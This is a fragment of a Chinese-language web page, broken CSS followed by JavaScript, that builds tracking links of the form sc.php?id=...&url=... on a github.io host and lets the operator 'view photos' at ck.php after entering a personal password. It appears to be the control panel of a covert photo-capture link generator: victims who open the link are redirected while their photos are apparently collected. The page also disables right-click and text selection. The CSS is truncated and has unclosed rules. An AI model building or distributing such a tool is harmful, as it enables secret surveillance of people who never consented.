        .notice-textarea {

        }
        
        .quick-links-title {
            color: #1890ff;
            margin-bottom: 20px;
            font-size: 18px;

            font-weight: 600;
        }
        
        .quick-links-container {

        .quick-link-btn {

            }
            
            .tab-item {
                padding: 15px 10px;
                font-size: 15px;

    <script>
        // 标签切换功能
        function switchTab(tabId) {
            // 隐藏所有标签页
            document.querySelectorAll('.tab-panel').forEach(panel => {
                panel.classList.remove('active');
            });
            
            // 移除所有标签的激活状态
            document.querySelectorAll('.tab-item').forEach(item => {
                item.classList.remove('active');
            });
            
            // 激活选中的标签页
            document.getElementById('tab-' + tabId).classList.add('active');
            
            // 激活选中的标签
            event.target.classList.add('active');
        }
        
        // 生成链接功能
        function create() {
            var kd = document.getElementById('kd');
            var myid = document.getElementById('myid');
            var url = document.getElementById('url');
            
            if (myid.value == "" || url.value == "") {
                alert("ID或跳转地址不能为空！");
                return false;
            }
            
            var generatedLink = 'http://binjianb.github.io/bj/sc.php?id=' + myid.value + '&url=' + url.value;
            kd.href = generatedLink;
            kd.style.pointerEvents = 'auto';
            kd.innerText = generatedLink;
            
            // 使用layer弹窗提示
            if (typeof layer !== 'undefined') {
                layer.msg('链接生成成功！', {icon: 1});
            } else {
                alert('链接生成成功！');
            }
        }
        
        // 查看照片功能
        function viewPhotos() {
            var myid = document.getElementById('myid').value;
            if (myid == "") {
                alert('请输入独立密码！');
                return false;
            }
            window.location.href = 'ck.php?id=' + myid;
        }
        
        // 防复制和右键菜单
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
        });
        
        // 页面加载完成
        $(document).ready(function(){
